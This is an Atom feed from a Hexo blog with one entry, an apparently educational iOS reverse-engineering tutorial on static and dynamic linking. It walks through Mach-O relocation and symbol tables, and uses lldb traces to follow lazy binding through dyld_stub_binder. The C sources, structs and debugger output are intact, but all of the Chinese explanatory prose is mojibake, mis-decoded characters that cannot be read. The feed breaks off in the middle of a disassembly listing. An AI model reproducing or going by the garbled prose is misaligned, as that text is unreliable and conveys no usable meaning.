<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>o0xmuhe&#39;s blog</title>
  
  <subtitle>control $pc, control the world</subtitle>
  <link href="http://o0xmuhe.me/atom.xml" rel="self"/>
  
  <link href="http://o0xmuhe.me/"/>
  <updated>2021-07-20T08:08:05.162Z</updated>
  <id>http://o0xmuhe.me/</id>
  
  <author>
    <name>muhe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iOS RE 4 beginners 2 - é™æ€é“¾æ¥&amp;&amp;åŠ¨æ€é“¾æ¥</title>
    <link href="http://o0xmuhe.me/2021/07/14/iOS-RE-4-beginners-2/"/>
    <id>http://o0xmuhe.me/2021/07/14/iOS-RE-4-beginners-2/</id>
    <published>2021-07-14T09:15:47.000Z</published>
    <updated>2021-07-20T08:08:05.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h1><p>macos11.4 + iphone6 iOS 12.2</p><a id="more"></a><h1 id="é™æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥"></a>é™æ€é“¾æ¥</h1><p>é™æ€é“¾æ¥ï¼šè¾“å…¥å¤šä¸ªç›®æ ‡æ–‡ä»¶ï¼Œè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ï¼ˆä¸€èˆ¬æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒæŠŠå¤šä¸ªç›®æ ‡æ–‡ä»¶é‡Œç›¸åŒæ€§è´¨çš„æ®µåˆå¹¶åˆ°ä¸€èµ·ã€‚</p><h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><ul><li>åœ°å€å’Œç©ºé—´åˆ†é… (Address and Storage Allocation)</li><li>ç¬¦å·å†³è®® (Symbol Resolution) / ç¬¦å·ç»‘å®š (Symbol Binding)</li><li>é‡å®šä½ (Relocation)</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled.png"></p><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~/study/ios_re_link/static_link î‚° cat main.c</span><br><span class="line"></span><br><span class="line">extern int global_var;</span><br><span class="line"></span><br><span class="line">int foo(int i);</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line"></span><br><span class="line">    int ret = foo(42 + global_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> ~/study/ios_re_link/static_link î‚° cat foo.c</span><br><span class="line">int global_var = 0x1337;</span><br><span class="line"></span><br><span class="line">int foo(int i)&#123;</span><br><span class="line">    <span class="built_in">return</span> i + global_var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/study/ios_re_link/static_link î‚° xcrun -sdk iphoneos clang -c main.c foo.c -target arm64-apple-ios12.2</span><br><span class="line">~/study/ios_re_link/static_link î‚° xcrun -sdk iphoneos clang main.o foo.o -o main -target arm64-apple-ios12.2</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ¨¡å—(main.o å’Œ foo.o) é€šè¿‡é™æ€é“¾æ¥ç»„åˆæˆäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶(main)</p><h2 id="æ¨¡å—-amp-amp-äº§ç‰©"><a href="#æ¨¡å—-amp-amp-äº§ç‰©" class="headerlink" title="æ¨¡å—&amp;&amp;äº§ç‰©"></a>æ¨¡å—&amp;&amp;äº§ç‰©</h2><h3 id="main-o"><a href="#main-o" class="headerlink" title="main.o"></a>main.o</h3><p>é€šè¿‡machoviewå¯ä»¥çœ‹åˆ°é‡å®šä½æ®µæœ‰ä¸‰æ¡ä¿¡æ¯ï¼Œæ„å‘³ç€ç¨‹åºä¸­æœ‰ä¸‰å¤„éœ€è¦é‡å®šä½å¤„ç†ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%201.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%201.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%202.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%202.png"></p><p>è¿™ä¸ªå›¾æ˜¯hopperåæ±‡ç¼–çš„mainå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å¯¹äºå¼•ç”¨åˆ°å…¶ä»–æ¨¡å—(foo.o)é‡çš„å˜é‡/å‡½æ•°çš„åœ°æ–¹çœ‹èµ·æ¥â€œæ­£å¸¸â€ï¼Œä½†æ˜¯ç‚¹å‡» <code>bl _foo</code> å°±ä¼šå‘ç°è·³è½¬åˆ°äº†ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%203.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%203.png"></p><p>æ ¹æ®&lt;macho/reloc.h&gt;çš„å®šä¹‰ï¼Œå¯ä»¥çœ‹åˆ°relocæ®µçš„ç»“æ„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct relocation_info &#123;</span><br><span class="line">   int32_t    r_address;    /* offset <span class="keyword">in</span> the section to what is being</span><br><span class="line">                   relocated */</span><br><span class="line">   uint32_t     r_symbolnum:24,    /* symbol index <span class="keyword">if</span> r_extern == 1 or section</span><br><span class="line">                   ordinal <span class="keyword">if</span> r_extern == 0 */</span><br><span class="line">        r_pcrel:1,     /* was relocated pc relative already */</span><br><span class="line">        r_length:2,    /* 0=byte, 1=word, 2=long, 3=quad */</span><br><span class="line">        r_extern:1,    /* does not include value of sym referenced */</span><br><span class="line">        r_type:4;    /* <span class="keyword">if</span> not 0, machine specific relocation <span class="built_in">type</span> */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šé¢çš„å›¾æ¥çœ‹(ä»¥_fooç¬¦å·ä¸ºä¾‹)ï¼š</p><ul><li>r_address : 0x28</li><li>r_symbolnum(24bits): æŒ‡å‘_foo å­—ç¬¦ä¸²</li><li>å‰©ä¸‹çš„8bitsæ˜¯æ ‡å¿—ä½</li></ul><p>å¯¹åº”åˆ°æ±‡ç¼–é‡Œå°±æ˜¯ï¼Œmainå‡½æ•°çš„0x28è¡Œå¼•ç”¨äº† _foo ç¬¦å·ï¼Œrelocæ®µæŠŠè¿™ä¸ªä¿¡æ¯å‘ŠçŸ¥linkerï¼Œè¿™æ ·åœ¨é“¾æ¥çš„æ—¶å€™linkerå°±ä¼šå¤„ç†è¿™æ¡ä¿¡æ¯ï¼ŒæŠŠå¯¹åº”çš„ç¬¦å·åšæ›¿æ¢å¤„ç†ã€‚</p><h3 id="foo-o"><a href="#foo-o" class="headerlink" title="foo.o"></a>foo.o</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%204.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%204.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%205.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%205.png"></p><p>å…¶å®éƒ½æ˜¯å¯¹ <code>global_var</code>çš„å¼•ç”¨</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%206.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%206.png"></p><p>åœ¨foo.oæ¨¡å—ä¸­ï¼Œæ˜¯ 0x20å¤„çš„dataï¼Œè¿™ä¸ªä¿¡æ¯ä¹Ÿè¦å‘Šè¯‰linkerï¼Œåœ¨linkçš„é˜¶æ®µåšæ›¿æ¢ã€‚</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>æœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶mainï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰é‡å®šä½ä¿¡æ¯ï¼Œè€Œä¸”mianå’Œfooå‡½æ•°ä¸­æ”¹æ›¿æ¢çš„ç¬¦å·éƒ½å·²ç»å®Œæˆäº†æ›¿æ¢ï¼Œå¯ä»¥é¡ºåˆ©çš„ç´¢å¼•åˆ°æƒ³è¦ä½¿ç”¨çš„ç¬¦å·(fooå’Œglobal_var)ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%207.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%207.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%208.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%208.png"></p><p>å¯¹æ¯”ä¸¤è€…ç¬¦å·è¡¨ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%209.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%209.png"></p><p>ä»¥fooç¬¦å·ä¸ºä¾‹ : </p><p>Type ä» N_UNDF â†’ NSECT</p><p>Value ä»0 â†’ 0x100007f90 </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.17.57@2x.png" alt="CleanShot 2021-07-20 at 15.17.57@2x"></p><p>ç¬¦å·è¡¨ç»“æ„:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct nlist_64 &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        uint32_t n_strx;   /* index into the string table */</span><br><span class="line">    &#125; n_un;</span><br><span class="line">    uint8_t  n_type;       /* <span class="built_in">type</span> flag, see below */</span><br><span class="line">    uint8_t  n_sect;       /* section number or NO_SECT */</span><br><span class="line">    uint16_t n_desc;       /* see &lt;mach-o/stab.h&gt; */</span><br><span class="line">    uint64_t n_value;      /* value of this symbol (or stab offset) */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>foo ç¬¦å·çš„è¯</p><ul><li>string table index : æŒ‡å‘ç¬¦å·çš„å­—ç¬¦ä¸²</li><li>n_sect : æ”¹ç¬¦å·åœ¨ç¬¬å‡ ä¸ªsection</li><li>n_value : ç¬¦å·å…·ä½“å€¼(åœ°å€)</li></ul><h2 id="ä¸¾ä¸ªğŸŒ°"><a href="#ä¸¾ä¸ªğŸŒ°" class="headerlink" title="ä¸¾ä¸ªğŸŒ°"></a>ä¸¾ä¸ªğŸŒ°</h2><p>è¿™é‡Œä»¥demoä¸­ global_var ä½¿ç”¨çš„ä»£ç ä¸¾ä¾‹å­ã€‚</p><p>æºç ä¸­:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ret = foo(42 + global_var);</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯¹åº”åˆ°æ±‡ç¼–é‡Œåº”è¯¥æ˜¯:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0000000000000014         adrp       x9, <span class="comment">#0x0                                    ; 0x68@PAGE</span></span><br><span class="line">0000000000000018         ldr        x9, [x9, <span class="comment">#0x68]                             ; 0x68@PAGEOFF</span></span><br><span class="line">000000000000001c         ldr        w10, [x9]</span><br><span class="line">0000000000000020         add        w0, w10, <span class="comment">#0x2a</span></span><br><span class="line">0000000000000024         str        w8, [sp, <span class="comment">#0x10 + var_C]</span></span><br><span class="line">0000000000000028         bl         _foo</span><br></pre></td></tr></table></figure><p>å¯çŸ¥ w0 æ˜¯å‚æ•°ï¼Œw10æ˜¯global_varçš„å€¼ï¼Œæ¥è‡ªx9</p><p><code>w10  = [x9 + 0x68]</code> (æœªé‡å®šä½ä¿®å¤ï¼‰</p><p>æœ€å¼€å§‹ç´¢å¼•x9çš„æ—¶å€™å¯ä»¥å‘ç°æ˜¯æŠŠ0èµ‹ç»™äº†x9ï¼Œå› ä¸ºè¿™é‡Œè¿˜æ²¡æœ‰é‡å®šä½ï¼Œæ‰€ä»¥ç”¨0ä»£æ›¿ã€‚</p><p>æœ€ç»ˆçš„äº§ç‰©ä¸­å¯ä»¥çœ‹åˆ°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0000000100007f64         adrp       x9, <span class="comment">#0x100008000                            ; 0x100008000@PAGE</span></span><br><span class="line">0000000100007f68         add        x9, x9, <span class="comment">#0x0                                ; 0x100008000@PAGEOFF, _global_var</span></span><br><span class="line">0000000100007f6c         ldr        w10, [x9]                                   ; _global_var</span><br><span class="line">0000000100007f70         add        w0, w10, <span class="comment">#0x2a</span></span><br><span class="line">0000000100007f74         str        w8, [sp, <span class="comment">#0x10 + var_C]</span></span><br><span class="line">0000000100007f78         bl         _foo</span><br></pre></td></tr></table></figure><p>æŠŠ0æ›¿æ¢æˆäº† 0x100008000ï¼Œè¿™ä¸ªåœ°å€æ°å¥½æŒ‡å‘global_varã€‚</p><p>å¯ä»¥çœ‹åˆ°ç»è¿‡linkerçš„å¤„ç†ï¼Œå¯ä»¥æ­£ç¡®æ‰¾åˆ°global_varï¼Œç¬¦å·fooåŒç†</p><h1 id="åŠ¨æ€é“¾æ¥"><a href="#åŠ¨æ€é“¾æ¥" class="headerlink" title="åŠ¨æ€é“¾æ¥"></a>åŠ¨æ€é“¾æ¥</h1><h2 id="debug-set-up"><a href="#debug-set-up" class="headerlink" title="debug set up"></a>debug set up</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.18.24@2x.png" alt="CleanShot 2021-07-20 at 15.18.24@2x"></p><p>åº”è¯¥æ˜¯ç­¾åæœ‰é—®é¢˜ï¼Œæœ€ç»ˆè§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/security find-identity -v -p codesigning</span><br><span class="line"># get : A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455</span><br><span class="line"></span><br><span class="line">codesign -s "A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455" --entitlements entitlements.xml -f libFoo.dylib</span><br><span class="line">codesign -s "A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455" --entitlements entitlements.xml -f main</span><br><span class="line"></span><br><span class="line"># scp ....</span><br><span class="line"># ssh ....</span><br><span class="line">mude-iPhone:/tmp root# ./main</span><br><span class="line">magic is : 4919</span><br><span class="line">4920</span><br></pre></td></tr></table></figure><h2 id="debug-lazy-binding-process"><a href="#debug-lazy-binding-process" class="headerlink" title="debug lazy binding process"></a>debug lazy binding process</h2><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.19.30@2x.png" alt="CleanShot 2021-07-20 at 15.19.30@2x"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ <code>printf</code>çš„æ—¶å€™ï¼Œblè·³è¿‡å»å¹¶ä¸æ˜¯ printfå‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue &#x3D; &#39;com.apple.main-thread&#39;, stop reason &#x3D; instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf7c main</span><br><span class="line">-&gt;  0x10089bf7c: br     x16</span><br><span class="line">    0x10089bf80: ldr    w16, 0x10089bf88</span><br><span class="line">    0x10089bf84: b      0x10089bf68</span><br><span class="line">    0x10089bf88: udf    #0x0</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 &#x3D; 0x00000001d858080c  libdyld.dylib&#96;dyld_stub_binder</span><br><span class="line">(lldb) re re x0</span><br><span class="line">      x0 &#x3D; 0x000000010089bfa4  &quot;magic is : %d\n&quot;</span><br><span class="line">(lldb) re re x1</span><br><span class="line">      x1 &#x3D; 0x0000000000001337</span><br></pre></td></tr></table></figure><p>é€šè¿‡ <code>dyld_stub_binder</code> æ‰¾ <code>printf</code>çš„åœ°å€ï¼ŒæŠŠæ‰¾åˆ°çš„åœ°å€å†™å›åˆ° <code>DATA,__la_symbol_ptr</code></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.20.15@2x.png" alt="CleanShot 2021-07-20 at 15.20.15@2x"></p><p>ç¬¬äºŒæ¬¡è°ƒç”¨printfçš„æ—¶å€™å°±å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªåœ°æ–¹printfå‡½æ•°åœ°å€å·²ç»è¢«å†™è¿‡æ¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(lldb) x/10i <span class="variable">$pc</span></span><br><span class="line">-&gt;  0x100dcff60: 0x58000610   ldr    x16, <span class="comment">#0xc0                ; (void *)0x00000001d860e14c: printf</span></span><br><span class="line">    0x100dcff64: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff68: 0x10000611   adr    x17, <span class="comment">#0xc0                ; _dyld_private</span></span><br><span class="line">    0x100dcff6c: 0xd503201f   nop</span><br><span class="line">    0x100dcff70: 0xa9bf47f0   stp    x16, x17, [sp, <span class="comment">#-0x10]!</span></span><br><span class="line">    0x100dcff74: 0xd503201f   nop</span><br><span class="line">    0x100dcff78: 0x58000490   ldr    x16, <span class="comment">#0x90                ; (void *)0x00000001d858080c: dyld_stub_binder</span></span><br><span class="line">    0x100dcff7c: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff80: 0x18000050   ldr    w16, 0x100dcff88</span><br><span class="line">    0x100dcff84: 0x17fffff9   b      0x100dcff68</span><br><span class="line">(lldb) x/3i <span class="variable">$pc</span></span><br><span class="line">-&gt;  0x100dcff60: 0x58000610   ldr    x16, <span class="comment">#0xc0                ; (void *)0x00000001d860e14c: printf</span></span><br><span class="line">    0x100dcff64: 0xd61f0200   br     x16</span><br><span class="line">    0x100dcff68: 0x10000611   adr    x17, <span class="comment">#0xc0                ; _dyld_private</span></span><br><span class="line">(lldb) x/gx <span class="variable">$pc</span>+0xc0</span><br><span class="line">0x100dd0020: 0x00000001d860e14c</span><br><span class="line">(lldb) memory region 0x00000001d860e14c</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œå°±å¯ä»¥ç›´æ¥è·å–åˆ°åœ°å€ï¼Œç„¶åç›´æ¥è·³è½¬è¿‡å»å°±è¡Œ:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf60 main`printf + 4</span><br><span class="line">main`printf:</span><br><span class="line">-&gt;  0x10089bf60 <span class="tag">&lt;<span class="name">+4</span>&gt;</span>: ldr    x16, #0xc0                ; (void *)0x00000001d860e14c: printf</span><br><span class="line">    0x10089bf64 <span class="tag">&lt;<span class="name">+8</span>&gt;</span>: br     x16</span><br><span class="line">    0x10089bf68:      adr    x17, #0xc0                ; _dyld_private</span><br><span class="line">    0x10089bf6c:      nop</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) s</span><br><span class="line">Process 1453 stopped</span><br><span class="line">* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step into</span><br><span class="line">    frame #0: 0x000000010089bf64 main`printf + 8</span><br><span class="line">main`printf:</span><br><span class="line">-&gt;  0x10089bf64 <span class="tag">&lt;<span class="name">+8</span>&gt;</span>: br     x16</span><br><span class="line">    0x10089bf68:      adr    x17, #0xc0                ; _dyld_private</span><br><span class="line">    0x10089bf6c:      nop</span><br><span class="line">    0x10089bf70:      stp    x16, x17, [sp, #-0x10]!</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) re re x16</span><br><span class="line">     x16 = 0x00000001d860e14c  libsystem_c.dylib`printf</span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><h2 id="libdyld-dylib-dyld-stub-binder"><a href="#libdyld-dylib-dyld-stub-binder" class="headerlink" title="libdyld.dylib`dyld_stub_binder"></a>libdyld.dylib`dyld_stub_binder</h2><p>dyld-852çš„ä»£ç ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/CleanShot%202021-07-20%20at%2015.20.35@2x.png" alt="CleanShot 2021-07-20 at 15.20.35@2x"></p><p>å› ä¸ºæˆ‘ç›®æ ‡ç¯å¢ƒæ˜¯iOS12.2ï¼Œæ‰€ä»¥å…·ä½“æ±‡ç¼–ä»£ç æœ‰ä¸€äº›å·®åˆ«ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) x&#x2F;30i $pc</span><br><span class="line">-&gt;  0x1d858080c: 0xa9bf7bfd   stp    x29, x30, [sp, #-0x10]!</span><br><span class="line">    0x1d8580810: 0x910003fd   mov    x29, sp</span><br><span class="line">    0x1d8580814: 0xd103c3ff   sub    sp, sp, #0xf0             ; &#x3D;0xf0</span><br><span class="line">    0x1d8580818: 0xa93f07a0   stp    x0, x1, [x29, #-0x10]</span><br><span class="line">    0x1d858081c: 0xa93e0fa2   stp    x2, x3, [x29, #-0x20]</span><br><span class="line">    0x1d8580820: 0xa93d17a4   stp    x4, x5, [x29, #-0x30]</span><br><span class="line">    0x1d8580824: 0xa93c1fa6   stp    x6, x7, [x29, #-0x40]</span><br><span class="line">    0x1d8580828: 0xa93b27a8   stp    x8, x9, [x29, #-0x50]</span><br><span class="line">    0x1d858082c: 0xad3c07a0   stp    q0, q1, [x29, #-0x80]</span><br><span class="line">    0x1d8580830: 0xad3b0fa2   stp    q2, q3, [x29, #-0xa0]</span><br><span class="line">    0x1d8580834: 0xad3a17a4   stp    q4, q5, [x29, #-0xc0]</span><br><span class="line">    0x1d8580838: 0xad391fa6   stp    q6, q7, [x29, #-0xe0]</span><br><span class="line">    0x1d858083c: 0xf9400fa0   ldr    x0, [x29, #0x18]</span><br><span class="line">    0x1d8580840: 0xf9400ba1   ldr    x1, [x29, #0x10]</span><br><span class="line">    0x1d8580844: 0x940004e4   bl     0x1d8581bd4               ; _dyld_fast_stub_entry(void*, long)</span><br><span class="line">    0x1d8580848: 0xaa0003f0   mov    x16, x0</span><br><span class="line">    0x1d858084c: 0xa97f07a0   ldp    x0, x1, [x29, #-0x10]</span><br><span class="line">    0x1d8580850: 0xa97e0fa2   ldp    x2, x3, [x29, #-0x20]</span><br><span class="line">    0x1d8580854: 0xa97d17a4   ldp    x4, x5, [x29, #-0x30]</span><br><span class="line">    0x1d8580858: 0xa97c1fa6   ldp    x6, x7, [x29, #-0x40]</span><br><span class="line">    0x1d858085c: 0xa97b27a8   ldp    x8, x9, [x29, #-0x50]</span><br><span class="line">    0x1d8580860: 0xad7c07a0   ldp    q0, q1, [x29, #-0x80]</span><br><span class="line">    0x1d8580864: 0xad7b0fa2   ldp    q2, q3, [x29, #-0xa0]</span><br><span class="line">    0x1d8580868: 0xad7a17a4   ldp    q4, q5, [x29, #-0xc0]</span><br><span class="line">    0x1d858086c: 0xad791fa6   ldp    q6, q7, [x29, #-0xe0]</span><br><span class="line">    0x1d8580870: 0x910003bf   mov    sp, x29</span><br><span class="line">    0x1d8580874: 0xa8c17bfd   ldp    x29, x30, [sp], #0x10</span><br><span class="line">    0x1d8580878: 0x910043ff   add    sp, sp, #0x10             ; &#x3D;0x10</span><br><span class="line">    0x1d858087c: 0xd61f0200   br     x16</span><br><span class="line">    0x1d8580880: 0xd10103ff   sub    sp, sp, #0x40             ; 